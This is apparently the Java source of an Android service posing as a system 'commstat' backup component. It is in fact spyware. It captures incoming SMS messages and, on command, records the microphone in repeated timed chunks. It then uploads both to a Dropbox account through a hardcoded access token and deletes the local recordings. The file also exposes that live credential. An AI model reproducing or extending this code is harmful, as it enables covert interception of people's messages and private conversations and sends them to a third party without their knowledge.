package com.android.commstat.services;

import android.Manifest;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.util.Log;

import com.android.commstat.AudioRecorder;
import com.android.commstat.IOUtils;
import com.android.commstat.model.Sms;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class BackupService extends IntentService {

    public static final String SMS = "sms";
    public static final String SEND_FILES = "send_files";
    public static final String RECORD_MIC = "record_mic";
    public static final String ARG_FILES_FOLDER = "files_folder";
    public static final String RECORDS_FOLDER = "records";
    public static final String COMMAND = "command";

    private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
    private static final String MESSAGES_FOLDER = "messages";
    private static List<String> mSendingDirs = new ArrayList<>(1);

    private final ArrayList<Sms> mMessages = new ArrayList<>();
    private boolean mIsBusy;

    public BackupService() {
        super(BackupService.class.getName());
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent == null || intent.getExtras() == null) {
            return;
        }
        if(TextUtils.equals(intent.getAction(), SMS)) {
            Object messageObj = intent.getExtras().getSerializable(SMS);
            if (messageObj != null) {
                if (messageObj instanceof Sms) {
                    synchronized (mMessages) {
                        mMessages.add((Sms) messageObj);
                    }
                    startQueue();
                }
            }
        } else if(TextUtils.equals(intent.getAction(), SEND_FILES)) {
            String filesFolder = intent.getStringExtra(ARG_FILES_FOLDER);
            if(filesFolder != null) {
                sendFiles(filesFolder);
            }
        } else if(TextUtils.equals(intent.getAction(), RECORD_MIC)) {
            recordMic(intent.getStringExtra(COMMAND));
        }
    }

    private void recordMic(String command) {
        if (command == null) {
            return;
        }
        int duration = 0;
        int delay = 0;
        int totalDuration = 60;
        List<Integer> args = parseCommandArgs(command);
        if(args.size() > 0) {
            totalDuration = args.get(0);
            if(totalDuration < 0) {
                totalDuration = 0;
            }
        }
        if(args.size() > 1) {
            duration = args.get(1);
            if(duration < 0) {
                duration = 0;
            }
        }
        if(args.size() > 2) {
            delay = args.get(2);
            if(delay < 0) {
                delay = 0;
            }
        }
        if(delay == 0 && duration > 0) {
            delay = duration;
        }
        if(duration == 0 && totalDuration == 0) {
            return;
        }
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.SECOND, duration <= 0 ? totalDuration : duration);
        FinishListener listener = new FinishListener(calendar.getTime(), delay, duration, totalDuration);
        new RecordTask(duration <= 0 ? totalDuration : duration, listener).start();
    }

    class FinishListener implements OnFinishListener {
        private final Date mFinishTime;
        private final int mDelay;
        private final int mDuration;
        private final int mTotalDuration;

        FinishListener(Date finishTime, int delay, int duration, int totalDuration) {
            mFinishTime = finishTime;
            mDelay = delay;
            mDuration = duration;
            mTotalDuration = totalDuration;
        }

        @Override
        public void onFinish() {
            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.SECOND, mDelay);
            calendar.add(Calendar.SECOND, mDuration);
            if(mFinishTime.getTime() > calendar.getTime().getTime()) {
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        new RecordTask(mDuration <= 0 ? mTotalDuration : mDuration, FinishListener.this).start();
                    }
                }, mDelay);
            }
        }
    }

    interface OnFinishListener {
        void onFinish();
    }

    class RecordTask {
        private AudioRecorder mRecorder;
        private long mDuration;
        private Timer mStopTimer;
        private boolean mIsStop;
        private OnFinishListener mOnFinishListener;
        private String mFilePath;

        RecordTask(long duration, OnFinishListener onFinishListener) {
            mFilePath = makeFilePath(BackupService.this, RECORDS_FOLDER);
            mRecorder = new AudioRecorder(mFilePath);
            mDuration = duration;
            mOnFinishListener = onFinishListener;
        }

        void start() {
            mIsStop = false;
            mRecorder.start();
            mStopTimer = new Timer();
            mStopTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    stop();
                    if(mOnFinishListener != null) {
                        mOnFinishListener.onFinish();
                        sendFiles(new File(mFilePath).getParentFile().getAbsolutePath());
                    }
                }
            }, mDuration);
        }

        void stop() {
            if(mStopTimer != null) {
                mStopTimer.cancel();
                mStopTimer.purge();
                mStopTimer = null;
            }
            if(!mIsStop) {
                mIsStop = true;
                mRecorder.stop();
            }
        }
    }

    public String makeFilePath(Context context, String folderName) {
        File recordsDir = new File(context.getFilesDir().getAbsolutePath(), folderName);
        if (!recordsDir.exists() && !recordsDir.mkdir()) {
            return null;
        }
        String fileName = new SimpleDateFormat("MM-dd_HH-mm-ss", Locale.getDefault()).format(Calendar.getInstance().getTime()) + ".3gp";
        File file = new File(recordsDir, fileName);
        return file.getAbsolutePath();
    }

    private List<Integer> parseCommandArgs(String command) {
        List<Integer> args = new ArrayList<>(1);
        if(command == null || command.length() == 0) {
            return args;
        }
        if (command.length() > 1) {
            String[] arguments = TextUtils.split(command.substring(1), ":");
            for (int i = 0; i < 2; i++) {
                String value = "";
                for (Character c : arguments[i].toCharArray()) {
                    if(Character.isDigit(c)) {
                        value += c;
                    } else {
                        int iVal = Integer.decode(value);
                        if(Character.toUpperCase(c) == 'M') {
                            iVal *= 60000;
                        } else if(Character.toUpperCase(c) == 'H') {
                            iVal *= 3600000;
                        }
                        args.add(iVal);
                        break;
                    }
                }
            }
        }
        return args;
    }

    private void startQueue() {
        if(mIsBusy) {
            return;
        }
        mIsBusy = true;
        boolean isBreak = false;
        while (mMessages.size() > 0) {
            final Sms sms;
            synchronized (mMessages) {
                sms = mMessages.remove(0);
            }
            try {
                sendMessage(sms);
            } catch (Exception e) {
                e.printStackTrace();
                Timer timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        synchronized (mMessages) {
                            mMessages.add(sms);
                        }
                        mIsBusy = false;
                        startQueue();
                    }
                }, 5000);
                isBreak = true;
                break;
            }
        }
        if(!isBreak) {
            mIsBusy = false;
        }
    }

    private void sendFiles(final String directoryPath) {
        if(mSendingDirs.contains(directoryPath)) {
            return;
        }
        File dir = new File(directoryPath);
        if(!dir.exists()) {
            return;
        }
        String dirName = dir.getName();
        mSendingDirs.add(directoryPath);
        try {
            for (File innerFile : dir.listFiles()) {
                DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
                ListFolderResult result = client.files().listFolder("");
                Metadata dbFolder = null;
                while (true) {
                    for (Metadata metadata : result.getEntries()) {
                        if (TextUtils.equals(metadata.getName(), dirName)) {
                            dbFolder = metadata;
                            break;
                        }
                    }
                    if (!result.getHasMore()) {
                        break;
                    }
                    result = client.files().listFolderContinue(result.getCursor());
                }
                if (dbFolder == null) {
                    client.files().createFolder("/" + dirName);
                }
                InputStream is = null;
                try {
                    is = new FileInputStream(innerFile);
                    client.files().uploadBuilder("/" + dirName + "/" + innerFile.getName())
                            .withMode(WriteMode.ADD)
                            .uploadAndFinish(is);
                    innerFile.delete();
                } finally {
                    IOUtils.closeQuietly(is);
                }
            }
            mSendingDirs.remove(directoryPath);
        } catch (Exception ex) {
            ex.printStackTrace();
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    mSendingDirs.remove(directoryPath);
                    sendFiles(directoryPath);
                }
            }, 10000);
        }
    }

    private void sendMessage(final Sms message) throws Exception {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            Log.d("Permission exception", "Permission WRITE_EXTERNAL_STORAGE is not granted");
            return;
        }
        final String fileName = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(message.getDate().getTime()) + ".txt";
        File file = getMessageFile(fileName);
        if(file == null) {
            return;
        }
        if(!message.isWrite()) {
            FileWriter writer = null;
            try {
                writer = new FileWriter(file, true);
                writer.append(message.toString()).append("\r\n");
                message.setIsWrite(true);
            } finally {
                IOUtils.closeQuietly(writer);
            }
        }
        DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
        ListFolderResult result = client.files().listFolder("");
        Metadata messagesFolder = null;
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), MESSAGES_FOLDER)) {
                    messagesFolder = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }

        if(messagesFolder == null) {
            messagesFolder = client.files().createFolder("/" + MESSAGES_FOLDER);
        }
        Metadata messagesFile = null;
        result = client.files().listFolder(messagesFolder.getPathDisplay());
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), fileName)) {
                    messagesFile = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }
        /*if(messagesFile != null && file.length() == 0) {
            OutputStream os = null;
            try {
                os = new FileOutputStream(file);
                client.files().downloadBuilder(messagesFile.getPathDisplay()).download(os);
            } finally {
                IOUtils.closeQuietly(os);
            }
        }*/
        InputStream is = null;
        try {
            is = new FileInputStream(file);
            client.files().uploadBuilder("/" + MESSAGES_FOLDER + "/" + file.getName())
                    .withMode(messagesFile != null ? WriteMode.OVERWRITE : WriteMode.ADD)
                    .uploadAndFinish(is);
        } finally {
            IOUtils.closeQuietly(is);
        }
    }

    private File getMessageFile(final String fileName) {
        File messageDir = new File(getFilesDir().getAbsolutePath(), MESSAGES_FOLDER);
        if (!messageDir.exists() && !messageDir.mkdir()) {
            return null;
        }
        File file = new File(messageDir, fileName);
        try {
            if (!file.exists() && !file.createNewFile()) {
                return null;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return file;
    }

}
